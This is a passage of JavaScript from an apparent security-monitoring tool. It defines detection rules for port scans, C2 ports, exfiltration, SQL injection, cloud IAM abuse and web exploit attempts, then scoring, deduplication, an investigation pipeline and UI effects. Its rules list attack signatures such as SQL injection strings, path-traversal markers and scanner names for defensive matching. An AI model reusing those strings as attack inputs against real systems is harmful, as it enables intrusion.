            narrative: evts => `Port scanning from ${evts[0]?.actor_ip||'unknown'} — ` +
              `${new Set(evts.map(e=>e.dest_port).filter(Boolean)).size} distinct ports probed`,
          },
          {
            id: 'BD-NET-002', name: 'Suspicious Outbound Connection — C2 / Exfil Port',
            technique: 'T1071.001', tactic: 'command-and-control', severity: 'high',
            match(norms) {
              const C2_PORTS = new Set([4444,4445,1337,31337,8888,9001,9002,2222,6667,6697,1194,8080]);
              return norms.filter(n => {
                const port = parseInt(n.dest_port || 0, 10);
                return n.source_type === 'network' && n.fwAction !== 'deny' &&
                       n.fwAction !== 'block' && n.fwAction !== 'drop' &&
                       C2_PORTS.has(port);
              });
            },
            narrative: evts => `C2/Exfil outbound connection to ${evts[0]?.dest_ip||'?'}:${evts[0]?.dest_port||'?'} ` +
              `from ${evts[0]?.actor_ip||'?'}`,
          },
          {
            id: 'BD-NET-003', name: 'Firewall Policy Violation — Repeated Blocked Connections',
            technique: null, tactic: 'initial-access', severity: 'medium',
            match(norms) {
              const blocked = norms.filter(n =>
                n.source_type === 'network' &&
                (n.fwAction === 'deny' || n.fwAction === 'block' || n.fwAction === 'drop')
              );
              const bySrc = new Map();
              blocked.forEach(n => {
                const k = n.actor_ip || '';
                if (!k) return;
                if (!bySrc.has(k)) bySrc.set(k, []);
                bySrc.get(k).push(n);
              });
              const suspicious = [];
              bySrc.forEach((evts, src) => { if (evts.length >= 5) suspicious.push(...evts); });
              return suspicious;
            },
            narrative: evts => `Repeated firewall blocks from ${evts[0]?.actor_ip||'?'} — ` +
              `${evts.length} blocked connections`,
          },
          {
            id: 'BD-NET-004', name: 'Data Exfiltration — Large Outbound Transfer',
            technique: 'T1041', tactic: 'exfiltration', severity: 'high',
            match(norms) {
              return norms.filter(n =>
                n.source_type === 'network' &&
                n.fwBytes > 50_000_000 && // 50MB threshold
                n.fwAction !== 'deny' && n.fwAction !== 'block'
              );
            },
            narrative: evts => `Large outbound transfer: ${(evts[0]?.fwBytes/1048576).toFixed(1)}MB ` +
              `from ${evts[0]?.actor_ip||'?'} to ${evts[0]?.dest_ip||'?'}`,
          },
        ],

        // ════════ DATABASE DOMAIN ════════════════════════════════
        database: [
          {
            id: 'BD-DB-001', name: 'Bulk Data Extraction — Mass SELECT Query',
            technique: 'T1005', tactic: 'collection', severity: 'high',
            match(norms) {
              return norms.filter(n => {
                const q = (n.dbQuery || '').toLowerCase();
                return n.source_type === 'database' &&
                  n.dbOperation === 'query_execution' &&
                  q.includes('select') &&
                  (q.includes('*') || q.includes('limit 0') || !q.includes('where') ||
                   q.includes('dump') || q.includes('into outfile') || q.includes('into dumpfile'));
              });
            },
            narrative: evts => `Mass data extraction via SELECT: user ${evts[0]?.dbUser||'?'} ` +
              `queried ${evts[0]?.dbTable||evts[0]?.dbName||'unknown table'}. Query: ` +
              `"${evts[0]?.dbQuery?.slice(0,150)||'N/A'}"`,
          },
          {
            id: 'BD-DB-002', name: 'Database Privilege Escalation',
            technique: 'T1098', tactic: 'persistence', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const q = (n.dbQuery || '').toLowerCase();
                return n.source_type === 'database' && (
                  n.dbOperation === 'privilege_change' ||
                  q.match(/(grant|revoke|create user|alter user|create role|drop user)/)
                );
              });
            },
            narrative: evts => `Database privilege escalation: "${evts[0]?.dbQuery?.slice(0,150)||'?'}" ` +
              `by ${evts[0]?.dbUser||'?'} on ${evts[0]?.dbName||'?'}`,
          },
          {
            id: 'BD-DB-003', name: 'Schema Destruction — DDL Attack',
            technique: 'T1485', tactic: 'impact', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const q = (n.dbQuery || '').toLowerCase();
                return n.source_type === 'database' &&
                  n.dbOperation === 'schema_modification' &&
                  q.match(/(drop table|drop database|truncate|alter table.*drop)/);
              });
            },
            narrative: evts => `DDL Destructive query: "${evts[0]?.dbQuery?.slice(0,150)||'?'}" ` +
              `by ${evts[0]?.dbUser||'?'}`,
          },
          {
            id: 'BD-DB-004', name: 'SQL Injection Pattern Detected',
            technique: 'T1190', tactic: 'initial-access', severity: 'high',
            // NOTE: T1190 validated for database/application domain
            match(norms) {
              return norms.filter(n => {
                const q = (n.dbQuery || n.httpUrl || '').toLowerCase();
                return (n.source_type === 'database' || n.source_type === 'application') && (
                  q.includes("' or '1'='1") || q.includes('1=1') ||
                  q.includes('union select') || q.includes('sleep(') ||
                  q.includes('benchmark(') || q.includes("'; drop table") ||
                  q.includes('xp_cmdshell') || q.includes("load_file(") ||
                  /('|--|;)\s*(select|insert|update|delete|drop|exec|union)/i.test(q)
                );
              });
            },
            narrative: evts => `SQL injection pattern in ${evts[0]?.source_type||'?'}: ` +
              `"${(evts[0]?.dbQuery||evts[0]?.httpUrl||'?').slice(0,150)}"`,
          },
        ],

        // ════════ CLOUD DOMAIN ═══════════════════════════════════
        cloud: [
          {
            id: 'BD-CLD-001', name: 'Cloud IAM Privilege Escalation',
            technique: 'T1078.004', tactic: 'privilege-escalation', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const ev = (n.cloudEventName || '').toLowerCase();
                return n.source_type === 'cloud' && (
                  ev.includes('attachuserpolicy') || ev.includes('putuserpolicy') ||
                  ev.includes('addroletogroup') || ev.includes('createpolicy') ||
                  ev.includes('putrolepolicy') || ev.includes('assumerole') ||
                  ev.includes('addpermission') || ev.includes('createaccesskey') ||
                  ev.includes('attachrolepolicy') || ev.includes('updateassumerolepolicydocument')
                );
              });
            },
            narrative: evts => `Cloud IAM privilege escalation: "${evts[0]?.cloudEventName||'?'}" ` +
              `by ${evts[0]?.cloudActor||'?'} in ${evts[0]?.cloudRegion||'?'} ` +
              `on resource ${evts[0]?.cloudResource?.slice(0,80)||'?'}`,
          },
          {
            id: 'BD-CLD-002', name: 'Cloud Storage Exfiltration — Mass Object Access',
            technique: 'T1530', tactic: 'exfiltration', severity: 'high',
            match(norms) {
              const accessCounts = new Map();
              norms.filter(n => n.source_type === 'cloud').forEach(n => {
                const ev = (n.cloudEventName || '').toLowerCase();
                if (!ev.includes('getobject') && !ev.includes('listbucket') &&
                    !ev.includes('getbucketobject') && !ev.includes('readobject')) return;
                const k = n.cloudActor || 'unknown';
                accessCounts.set(k, (accessCounts.get(k)||0) + 1);
              });
              const suspicious = [];
              accessCounts.forEach((cnt, actor) => {
                if (cnt >= 10) suspicious.push(actor);
              });
              if (!suspicious.length) return [];
              return norms.filter(n => n.source_type === 'cloud' &&
                suspicious.includes(n.cloudActor));
            },
            narrative: evts => `Mass cloud storage access: ${evts.length} object reads ` +
              `by ${evts[0]?.cloudActor||'?'} on bucket ${evts[0]?.cloudResource?.slice(0,60)||'?'}`,
          },
          {
            id: 'BD-CLD-003', name: 'Cloud Infrastructure Destruction',
            technique: 'T1485', tactic: 'impact', severity: 'critical',
            match(norms) {
              return norms.filter(n => {
                const ev = (n.cloudEventName || '').toLowerCase();
                return n.source_type === 'cloud' && (
                  ev.includes('terminateinstances') || ev.includes('deletedbinstance') ||
                  ev.includes('deletebucket') || ev.includes('deletecluster') ||
                  ev.includes('deletestack') || ev.includes('purgevault') ||
                  ev.includes('deleteresourcegroup') || ev.includes('deletesecret')
                );
              });
            },
            narrative: evts => `Cloud infrastructure destruction: "${evts[0]?.cloudEventName||'?'}" ` +
              `by ${evts[0]?.cloudActor||'?'} — resource: ${evts[0]?.cloudResource?.slice(0,80)||'?'}`,
          },
          {
            id: 'BD-CLD-004', name: 'Impossible Travel / Geographic Anomaly',
            technique: 'T1078.004', tactic: 'initial-access', severity: 'high',
            match(norms) {
              // Detect same actor from multiple distinct regions within short window
              const actorRegions = new Map();
              norms.filter(n => n.source_type === 'cloud' && n.cloudActor && n.cloudRegion)
                .forEach(n => {
                  const k = n.cloudActor;
                  if (!actorRegions.has(k)) actorRegions.set(k, new Set());
                  actorRegions.get(k).add(n.cloudRegion);
                });
              const suspicious = [];
              actorRegions.forEach((regions, actor) => {
                if (regions.size >= 3) suspicious.push(actor);
              });
              return norms.filter(n => n.source_type === 'cloud' &&
                suspicious.includes(n.cloudActor));
            },
            narrative: evts => {
              const regions = [...new Set(evts.map(e=>e.cloudRegion).filter(Boolean))];
              return `Impossible travel: ${evts[0]?.cloudActor||'?'} accessed from ` +
                `${regions.length} regions: ${regions.slice(0,5).join(', ')}`;
            },
          },
        ],

        // ════════ APPLICATION DOMAIN ═════════════════════════════
        application: [
          {
            id: 'BD-APP-001', name: 'Brute Force Authentication — App/API',
            technique: 'T1110', tactic: 'credential-access', severity: 'high',
            match(norms) {
              const bySrc = new Map();
              norms.filter(n => n.source_type === 'application').forEach(n => {
                const code = parseInt(n.httpStatus || 0, 10);
                if (code !== 401 && code !== 403) return;
                const k = n.actor_ip || n.actor || 'unknown';
                if (!bySrc.has(k)) bySrc.set(k, []);
                bySrc.get(k).push(n);
              });
              const suspicious = [];
              bySrc.forEach((evts, src) => { if (evts.length >= 5) suspicious.push(...evts); });
              return suspicious;
            },
            narrative: evts => `API/App brute force: ${evts.length} authentication failures ` +
              `from ${evts[0]?.actor_ip||'?'} targeting ${evts[0]?.httpUrl?.slice(0,60)||'?'}`,
          },
          {
            id: 'BD-APP-002', name: 'Web Application Attack — Exploit Attempt',
            technique: 'T1190', tactic: 'initial-access', severity: 'high',
            match(norms) {
              return norms.filter(n => {
                const url = (n.httpUrl || n.context?.url || '').toLowerCase();
                const ua  = (n.httpUserAgent || '').toLowerCase();
                return n.source_type === 'application' && (
                  url.includes('../') || url.includes('etc/passwd') ||
                  url.includes('<script') || url.includes('onload=') ||
                  url.includes('javascript:') || url.includes('eval(') ||
                  ua.includes('sqlmap') || ua.includes('nikto') ||
                  ua.includes('nmap') || ua.includes('masscan') ||
                  url.includes('cmd=') || url.includes('exec=') ||
                  url.includes('/wp-admin') || url.includes('/phpinfo')
                );
              });
            },
            narrative: evts => `Web attack attempt: "${evts[0]?.httpMethod||'?'} ` +
              `${evts[0]?.httpUrl?.slice(0,100)||'?'}" — UA: ${evts[0]?.httpUserAgent?.slice(0,60)||'?'}`,
          },
          {
            id: 'BD-APP-003', name: 'Sensitive Endpoint Access — Mass Data Pull',
            technique: 'T1530', tactic: 'collection', severity: 'medium',
            match(norms) {
              return norms.filter(n => {
                const url = (n.httpUrl || '').toLowerCase();
                return n.source_type === 'application' &&
                  n.httpMethod === 'GET' &&
                  (url.includes('/export') || url.includes('/dump') ||
                   url.includes('/download') || url.includes('/backup') ||
                   url.includes('/admin') || url.includes('/api/users') ||
                   url.includes('/api/all') || url.includes('/reports'));
              });
            },
            narrative: evts => `Sensitive endpoint mass access: ${evts.length} requests to ` +
              `${evts[0]?.httpUrl?.slice(0,80)||'?'} by ${evts[0]?.actor||evts[0]?.actor_ip||'?'}`,
          },
        ],
      },

      // ── Run all domain-matched behavior rules ──────────────────
      analyze(normEvents, domain) {
        const rules  = this.DOMAIN_RULES[domain] || [];
        const result = [];
        for (const rule of rules) {
          try {
            const matched = rule.match(normEvents);
            if (!matched || !matched.length) continue;

            // ── Context Validation Gate (Policy §3) ────────────
            const ctxCheck = CONTEXT_VALIDATOR.validate(matched[0], domain);
            if (!ctxCheck.valid) continue;

            // ── MITRE Validation Gate (Policy §8) ──────────────
            const mitreResult = MITRE_VALIDATOR.validate(rule.technique, domain, matched[0], matched);

            // ── Evidence Fusion (Policy §5 — ONE detection) ────
            const evidenceBlock = EVIDENCE_FUSER.fuse(matched, domain);

            // ── Tool Intelligence Override (Policy §7) ─────────
            const cmdStr  = (matched[0]?.commandLine || '').toLowerCase();
            const procStr = (matched[0]?.process || '').toLowerCase();
            let knownTool = false;
            let toolOverride = null;
            for (const [tool, fp] of Object.entries(BEHAVIORAL_FINGERPRINTS)) {
              if (procStr.includes(tool) || cmdStr.includes(tool)) {
                knownTool = true;
                toolOverride = fp;
                break;
              }
            }

            // Tool override: use tool-specific technique if compatible
            let finalTechnique = mitreResult.technique;
            let finalTactic    = rule.tactic;
            if (knownTool && toolOverride) {
              const toolMitre = MITRE_VALIDATOR.validate(toolOverride.technique, domain, matched[0], matched);
              if (toolMitre.technique) {
                finalTechnique = toolMitre.technique;
                finalTactic    = toolOverride.tactic;
              }
            }

            // ── Confidence Scoring (Policy §9) ─────────────────
            const confScore = CONFIDENCE_SCORER.score(
              evidenceBlock, knownTool,
              true,  // domain always matches here
              !!finalTechnique
            );

            // ── Fail-Safe Mode (Policy §10) ────────────────────
            if (confScore.level === 'LOW' && !knownTool && !finalTechnique) {
              result.push({
                ruleId     : rule.id,
                ruleName   : 'Suspicious Activity',
                source_type: domain,
                technique  : null,
                tactic     : null,
                severity   : 'low',
                confidence : confScore,
                evidenceBlock,
                matchedEvents: matched,
                narrative  : `Suspicious ${domain} activity — insufficient evidence for definitive classification`,
                timestamp  : matched[0]?.timestamp || new Date().toISOString(),
                _failSafe  : true,
              });
              continue;
            }

            // ── Standardized Output (Policy §11) ───────────────
            result.push({
              ruleId      : rule.id,
              ruleName    : rule.name,
              source_type : domain,
              event_type  : matched[0]?.event_type || 'generic',
              technique   : finalTechnique,
              tactic      : finalTactic,
              severity    : knownTool && toolOverride?.severity ? toolOverride.severity : rule.severity,
              confidence  : confScore,
              mitre       : { technique: finalTechnique, tactic: finalTactic, name: rule.name },
              evidenceBlock,
              matchedCount: matched.length,
              matchedEvents: matched.slice(0, 10), // max 10 evidence events
              actor       : matched[0]?.actor || '',
              actor_host  : matched[0]?.actor_host || '',
              actor_ip    : matched[0]?.actor_ip || matched[0]?.srcIp || '',
              target      : matched[0]?.target || '',
              timestamp   : matched[0]?.timestamp || new Date().toISOString(),
              narrative   : rule.narrative(matched),
              _knownTool  : knownTool,
              _toolOverride: toolOverride,
            });
          } catch(err) {
            console.warn('[BEHAVIOR_DETECTOR] Rule error:', rule.id, err.message);
          }
        }
        return result;
      },
    };

    // ════════════════════════════════════════════════════════════════
    //  DEDUP_GATE  (Policy §6 — duplication prohibition)
    //  ONE behavior = ONE detection. Merges field-level duplicates.
    //  Policy §12: Single source of truth rule.
    //  Policy §13: Timeline deduplication.
    //  Policy §16: Chain formation only for distinct techniques.
    // ════════════════════════════════════════════════════════════════
    function _behaviorDedupGate(detections) {
      const seen = new Map(); // key → best detection
      for (const det of detections) {
        // Build dedup key from behavior signature (not field-level)
        const key = [
          det.ruleId,
          det.actor || '',
          det.actor_host || '',
          (det.technique || 'none'),
          (det.evidenceBlock?.correlation_keys?.[0] || ''),
        ].join('::');
        if (!seen.has(key)) {
          seen.set(key, det);
        } else {
          // Merge: keep the higher-confidence detection, merge evidence
          const existing = seen.get(key);
          if (det.confidence.score > existing.confidence.score) {
            det.matchedCount = (det.matchedCount||1) + (existing.matchedCount||1);
            seen.set(key, det);
          } else {
            existing.matchedCount = (existing.matchedCount||1) + (det.matchedCount||1);
          }
        }
      }
      return [...seen.values()];
    }

    // ════════════════════════════════════════════════════════════════
    //  RISK_ENGINE  (Policy §15 — deduplicated risk scoring)
    //  Uses ONLY deduplicated detections. Avoids inflation.
    //  Weights: behavior severity + confidence + correlation strength.
    // ════════════════════════════════════════════════════════════════
    function _calcBehaviorRisk(dedupedDets) {
      if (!dedupedDets.length) return 0;
      const SEV = { critical: 30, high: 20, medium: 10, low: 5 };
      const CONF = { HIGH: 1.0, MEDIUM: 0.7, LOW: 0.4 };
      let score = 0;
      for (const d of dedupedDets) {
        const sevScore  = SEV[d.severity] || 5;
        const confMult  = CONF[d.confidence?.level] || 0.5;
        const corrBoost = Math.min((d.evidenceBlock?.fields_present?.length || 1) * 0.1, 0.5);
        score += sevScore * confMult * (1 + corrBoost);
      }
      return Math.min(Math.round(score), 100);
    }

    // ════════════════════════════════════════════════════════════════
    //  BEHAVIOR_CHAIN_BUILDER  (Policy §16 — distinct techniques only)
    //  Forms attack chains ONLY from distinct techniques + progression.
    // ════════════════════════════════════════════════════════════════
    function _buildBehaviorChain(dedupedDets) {
      // Only chain if multiple DISTINCT techniques exist (Policy §16)
      const distinctTechniques = [...new Set(
        dedupedDets.filter(d => d.technique).map(d => d.technique)
      )];
      if (distinctTechniques.length < 2) return [];

      // Sort by MITRE phase order for progression detection
      const phaseMap = {
        'reconnaissance':0,'initial-access':1,'execution':2,'persistence':3,
        'privilege-escalation':4,'defense-evasion':5,'credential-access':6,
        'discovery':7,'lateral-movement':8,'collection':9,
        'command-and-control':10,'exfiltration':11,'impact':12,
      };
      const sorted = [...dedupedDets].sort((a, b) => {
        const pa = phaseMap[a.tactic] ?? 99;
        const pb = phaseMap[b.tactic] ?? 99;
        if (pa !== pb) return pa - pb;
        return new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime();
      });

      // Check for clear progression (at least 2 distinct phases advancing)
      const phases = sorted.map(d => phaseMap[d.tactic] ?? 99).filter(p => p !== 99);
      const isProgression = phases.length >= 2 &&
        phases.some((p, i) => i > 0 && p > phases[i-1]);
      if (!isProgression && distinctTechniques.length < 3) return [];

      return [{
        id          : 'BD-CHAIN-' + Date.now().toString(36).toUpperCase(),
        stages      : sorted.map((d, i) => ({
          stageIndex  : i,
          ruleName    : d.ruleName,
          technique   : d.technique,
          tactic      : d.tactic,
          severity    : d.severity,
          confidence  : d.confidence?.score || 50,
          actor       : d.actor,
          actor_host  : d.actor_host,
          timestamp   : d.timestamp,
          narrative   : d.narrative,
          inferred    : false,
        })),
        riskScore   : _calcBehaviorRisk(sorted),
        severity    : sorted[0]?.severity || 'medium',
        techniques  : distinctTechniques,
        source_type : [...new Set(sorted.map(d => d.source_type))].join('+'),
      }];
    }

    // ════════════════════════════════════════════════════════════════
    //  INVESTIGATION ENGINE  (Policy-compliant, client-side)
    //  Runs the full behavior-first pipeline on session data.
    //  Used by the Manual Investigation tab.
    // ════════════════════════════════════════════════════════════════
    function investigateEntity(entity, entityType, timeRangeMs, sessionState) {
      const S      = sessionState || {};
      const allEvents = [
        ...(S.rawEvents || []),
        // Reconstruct events from existing detections' evidence
        ...(S.detections || []).flatMap(d => d.evidence || d.raw_detections || []),
      ];

      // ── 1. LOG_NORM: normalize all events ─────────────────────
      const normed = allEvents.map(_logNorm).filter(Boolean);

      // ── 2. Filter by entity and time range ─────────────────────
      const now    = Date.now();
      const cutoff = timeRangeMs ? now - timeRangeMs : 0;
      const entityLower = (entity || '').toLowerCase();
      const filtered = normed.filter(n => {
        // Time filter
        const ts = new Date(n.timestamp).getTime();
        if (cutoff > 0 && ts > 0 && ts < cutoff) return false;
        // Entity match (actor, host, IP, process, URL)
        return (
          (n.actor       && n.actor.toLowerCase().includes(entityLower)) ||
          (n.actor_host  && n.actor_host.toLowerCase().includes(entityLower)) ||
          (n.actor_ip    && n.actor_ip.toLowerCase().includes(entityLower)) ||
          (n.dest_ip     && n.dest_ip.toLowerCase().includes(entityLower)) ||
          (n.process     && n.process.toLowerCase().includes(entityLower)) ||
          (n.target      && n.target.toLowerCase().includes(entityLower)) ||
          (n.cloudActor  && n.cloudActor.toLowerCase().includes(entityLower)) ||
          (n.cloudResource && n.cloudResource.toLowerCase().includes(entityLower)) ||
          (n.dbUser      && n.dbUser.toLowerCase().includes(entityLower)) ||
          (n.httpUrl     && n.httpUrl.toLowerCase().includes(entityLower))
        );
      });

      // ── 3. DOMAIN_CLASSIFIER: group events by domain ───────────
      const byDomain = { endpoint:[], network:[], database:[], application:[], cloud:[] };
      filtered.forEach(n => {
        const dom = DOMAIN_CLASSIFIER.classify(n);
        if (byDomain[dom]) byDomain[dom].push(n);
      });

      // ── 4. BEHAVIOR_DETECTOR: run domain-specific rules ────────
      const rawFindings = [];
      for (const [domain, events] of Object.entries(byDomain)) {
        if (!events.length) continue;
        const domFindings = BEHAVIOR_DETECTOR.analyze(events, domain);
        rawFindings.push(...domFindings);
      }

      // Also include session detections related to entity (already deduped by CSDE)
      const relatedDets = (S.detections || []).filter(d => {
        return (
          (d.user      && d.user.toLowerCase().includes(entityLower)) ||
          (d.computer  && d.computer.toLowerCase().includes(entityLower)) ||
          (d.srcIp     && d.srcIp.toLowerCase().includes(entityLower)) ||
          (d.host      && d.host.toLowerCase().includes(entityLower))
        );
      }).map(d => ({
        ruleId      : d.ruleId || d.id || 'LEGACY',
        ruleName    : d.ruleName || d.detection_name || d.title || 'Detection',
        source_type : d._logSource || d.logCategory || 'endpoint',
        event_type  : d.event_type || 'generic',
        technique   : d.mitre?.technique || d.technique || null,
        tactic      : d.mitre?.tactic || d.tactic || null,
        severity    : d.severity || d.aggregated_severity || 'medium',
        confidence  : { score: d.confidence || 50, level: d.confidence >= 80 ? 'HIGH' : d.confidence >= 50 ? 'MEDIUM' : 'LOW' },
        mitre       : d.mitre || { technique: d.technique||null, tactic: d.tactic||null },
        evidenceBlock: { fields_present: ['legacy'], evidence_count: d.event_count || 1 },
        matchedEvents: d.evidence || [],
        actor       : d.user || '',
        actor_host  : d.computer || d.host || '',
        actor_ip    : d.srcIp || '',
        timestamp   : d.timestamp || d.first_seen || new Date().toISOString(),
        narrative   : d.narrative || '',
        _fromSession: true,
      }));
      rawFindings.push(...relatedDets);

      // ── 5. DEDUP_GATE: enforce one-behavior = one-detection ────
      const findings = _behaviorDedupGate(rawFindings);

      // ── 6. Risk scoring (deduplication-aware) ──────────────────
      const riskScore = _calcBehaviorRisk(findings);

      // ── 7. MITRE map (validated only) ──────────────────────────
      const mitreMap = findings
        .filter(f => f.technique && f.tactic)
        .map(f => ({
          technique: f.technique,
          tactic   : f.tactic,
          name     : f.ruleName,
          confidence: f.confidence?.level || 'LOW',
          source_type: f.source_type,
        }));

      // ── 8. Behavior chain (distinct techniques + progression) ──
      const chains = _buildBehaviorChain(findings);

      // ── 9. Deduplicated timeline (Policy §13) ──────────────────
      const timelineMap = new Map();
      filtered.forEach(n => {
        const key = `${n.event_type}::${n.actor}::${n.actor_host}::${n.timestamp}`;
        if (!timelineMap.has(key)) {
          timelineMap.set(key, {
            timestamp  : n.timestamp,
            event_type : n.event_type,
            source_type: n.source_type,
            actor      : n.actor,
            actor_host : n.actor_host,
            actor_ip   : n.actor_ip,
            action     : n.action || n.commandLine || n.cloudEventName || n.httpMethod || '',
            target     : n.target || n.dest_ip || n.cloudResource || n.httpUrl || '',
            description: `[${n.source_type.toUpperCase()}] ${n.event_type.replace(/_/g,' ')}: ` +
                         `${(n.action||n.commandLine||n.cloudEventName||'').slice(0,80)}`,
          });
        }
      });
      const timeline = [...timelineMap.values()]
        .sort((a,b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime());

      // ── 10. Domain summary ─────────────────────────────────────
      const domainSummary = {};
      for (const [dom, evts] of Object.entries(byDomain)) {
        if (evts.length) domainSummary[dom] = evts.length;
      }

      // ── 11. Auto-detect entity type ────────────────────────────
      let detectedType = entityType || 'auto';
      if (detectedType === 'auto') {
        if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(entity)) detectedType = 'ip';
        else if (/^[0-9a-f]{32,64}$/i.test(entity)) detectedType = 'hash';
        else if (entity.includes('@') || entity.includes('/')) detectedType = 'user';
        else if (entity.includes('arn:') || entity.includes('projects/')) detectedType = 'cloud_resource';
        else if (entity.toLowerCase().match(/\.(exe|dll|bat|ps1|sh|py)$/)) detectedType = 'process';
        else detectedType = filtered.some(n => n.actor_host?.toLowerCase().includes(entityLower)) ? 'host' : 'user';
      }

      return {
        entityId    : entity,
        type        : detectedType,
        riskScore,
        findings,           // behavior-first, deduped (Policy §14)
        timeline,           // attack-progression, no dups (Policy §13)
        mitreMap    : { techniques: mitreMap },
        chain       : chains[0] || null,
        chains,
        domainSummary,
        totalEvents : filtered.length,
        summary     : findings.length
          ? `${findings.length} behavior-based finding${findings.length>1?'s':''} across ` +
            `${Object.keys(domainSummary).join(', ')} domains. Risk: ${riskScore}/100.`
          : `No behavioral findings for "${entity}" in current session data.`,
        _meta: {
          eventsAnalyzed  : filtered.length,
          normEvents      : normed.length,
          rawFindingsCount: rawFindings.length,
          dedupedCount    : findings.length,
          policyVersion   : 'BEHAVIOR-FIRST-v1',
          domains         : Object.keys(domainSummary),
        },
      };
    }

    return { analyzeEvents, getSampleEvents, mergeDetections, processBackendResult,
             _dedupDetections, _normalizeRuleName, _baseRuleId, _canonicalSlug, _normalizeExternalDet,
             _inferEventsOs, _inferOsFromTitle,
             // CSDE v4
             _validateEventSchema, _crossLinkEvents, _correlateIncidents,
             LOG_SCHEMA, _classifyEventSource,
             // BEHAVIOR-FIRST-v1 (Policy §1-§16)
             _logNorm, DOMAIN_CLASSIFIER, CONTEXT_VALIDATOR, MITRE_VALIDATOR,
             EVIDENCE_FUSER, CONFIDENCE_SCORER, BEHAVIOR_DETECTOR,
             _behaviorDedupGate, _calcBehaviorRisk, _buildBehaviorChain,
             investigateEntity };

  })(); // end CSDE


  // ════════════════════════════════════════════════════════════════
  //  ENTRY POINT
  // ════════════════════════════════════════════════════════════════
  async function render(container) {
    container = container || document.getElementById('raykanWrap');
    if (!container) return;
    container.innerHTML = _buildUI();
    _attachEvents();
    _setTab('overview');
    await _loadStats();
    _connectWS();
    // ── Post-render visual enhancements ──
    _startMatrixRain();
    _startStatCountUp();
    _startHeaderParticles();
  }

  // ── Matrix rain canvas background ────────────────────────────
  function _startMatrixRain() {
    const root = document.getElementById('rk-root');
    if (!root) return;
    // Remove existing canvas if any
    const existing = document.getElementById('rk-matrix-canvas');
    if (existing) existing.remove();

    const canvas = document.createElement('canvas');
    canvas.id = 'rk-matrix-canvas';
    canvas.style.cssText = 'position:absolute;inset:0;pointer-events:none;z-index:0;opacity:0.055;';
    root.insertBefore(canvas, root.firstChild);

    const ctx    = canvas.getContext('2d');
    const chars  = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()[]{}|<>/\\;:.,';
    const hexchars = '0123456789ABCDEF';
    const fontSize = 11;
    let   drops   = [];
    let   raf;

    function resize() {
      canvas.width  = root.offsetWidth;
      canvas.height = root.offsetHeight;
      const cols    = Math.floor(canvas.width / fontSize);
      drops = Array.from({ length: cols }, () => Math.random() * -100);
    }

    function draw() {
      ctx.fillStyle = 'rgba(2,6,10,0.08)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.font = fontSize + 'px "JetBrains Mono",monospace';

      for (let i = 0; i < drops.length; i++) {
        // Alternate between hex chars and regular chars
        const char = (i % 3 === 0)
          ? hexchars[Math.floor(Math.random() * hexchars.length)]
          : chars[Math.floor(Math.random() * chars.length)];

        // Leading character is brighter (cyan)
        const y = drops[i] * fontSize;
        if (y > 0 && y < canvas.height) {
          // Bright lead character
          ctx.fillStyle = `rgba(0,212,255,0.9)`;
          ctx.fillText(char, i * fontSize, y);
          // Dim trail character behind
          if (drops[i] > 1) {
            ctx.fillStyle = `rgba(0,140,180,0.3)`;
            ctx.fillText(hexchars[Math.floor(Math.random() * hexchars.length)],
              i * fontSize, (drops[i] - 1) * fontSize);
          }
        }

        drops[i]++;
        // Random reset when column exits bottom
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = Math.random() * -30;
        }
      }
    }

    resize();
    const resizeObs = new ResizeObserver(resize);
    resizeObs.observe(root);

    let lastTime = 0;
    const FPS = 20; // low fps for subtlety
    function loop(ts) {
      if (!document.getElementById('rk-matrix-canvas')) {
        resizeObs.disconnect();
        return; // stop if removed
      }
      if (ts - lastTime > 1000 / FPS) {
        draw();
        lastTime = ts;
      }
      raf = requestAnimationFrame(loop);
    }
    raf = requestAnimationFrame(loop);
  }

  // ── Stat card count-up animation ────────────────────────────
  function _startStatCountUp() {
    // Triggered after stat values update — adds bounce class
    const observer = new MutationObserver(mutations => {
      mutations.forEach(m => {
        if (m.target.classList.contains('rk-stat-val')) {
          m.target.classList.remove('updated');
          void m.target.offsetWidth; // reflow
          m.target.classList.add('updated');
        }
      });
    });
    document.querySelectorAll('.rk-stat-val').forEach(el => {
      observer.observe(el, { childList: true, characterData: true, subtree: true });
    });
  }

  // ── Subtle particle effect around header ────────────────────
  function _startHeaderParticles() {
    const hdr = document.querySelector('.rk-hdr');
    if (!hdr) return;
    // Create floating data-bits in the header area
    const createParticle = () => {
      if (!document.querySelector('.rk-hdr')) return;
      const p = document.createElement('div');
      const size = Math.random() * 3 + 1;
      const startX = Math.random() * 100;
      const dur = Math.random() * 4 + 3;
      const delay = Math.random() * 2;
      p.style.cssText = `
        position:absolute;
        left:${startX}%;
        bottom:0;
        width:${size}px;
        height:${size}px;
        background:rgba(0,212,255,${0.3 + Math.random()*0.4});
        border-radius:50%;
        pointer-events:none;
        z-index:0;
        animation: rk-particle-rise ${dur}s ease-out ${delay}s forwards;
        box-shadow: 0 0 ${size*3}px rgba(0,212,255,0.6);
      `;
      hdr.appendChild(p);
      setTimeout(() => p.remove(), (dur + delay + 0.5) * 1000);
    };

    // Inject CSS for particle rise
    if (!document.getElementById('rk-particle-css')) {
      const style = document.createElement('style');
      style.id = 'rk-particle-css';
      style.textContent = `
        @keyframes rk-particle-rise {
          0%   { transform: translateY(0) scale(1); opacity: 0.8; }
          100% { transform: translateY(-60px) scale(0.3); opacity: 0; }
        }
      `;
      document.head.appendChild(style);
    }

    // Spawn particles every 600ms
    const interval = setInterval(() => {
      if (!document.querySelector('.rk-hdr')) {
        clearInterval(interval);
        return;
      }
      createParticle();
    }, 600);
  }

  // ════════════════════════════════════════════════════════════════
  //  UI BUILDER
  // ════════════════════════════════════════════════════════════════
  function _buildUI() {
    return `
<style>
  /* ══════════════════════════════════════════════════════════════
     RAYKAN CYBER UI v2.0 — Professional Cybersecurity Design System
     Dark neural-net aesthetic · Neon glow · Animated threat indicators
  ══════════════════════════════════════════════════════════════ */

  /* ── Base & Reset ── */
  .rk-root { display:flex; flex-direction:column; height:100%; min-height:600px;
